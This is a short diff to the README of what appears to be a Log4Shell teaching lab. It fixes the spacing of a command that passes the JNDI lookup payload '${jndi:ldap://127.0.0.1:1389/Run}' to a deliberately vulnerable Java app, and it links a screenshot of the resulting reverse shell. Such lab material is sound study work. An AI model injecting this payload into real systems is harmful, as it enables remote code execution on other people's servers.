@@ -52,7 +52,7 @@ mvn -f pom.xml clean package -DskipTests
 
 ```
 cd vulnApps/basicJar
-java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar  com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
+java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'
 ```
 
 ![](resources/images/log4jshell-trigger-rce-basicjar-reverseshell3.png)
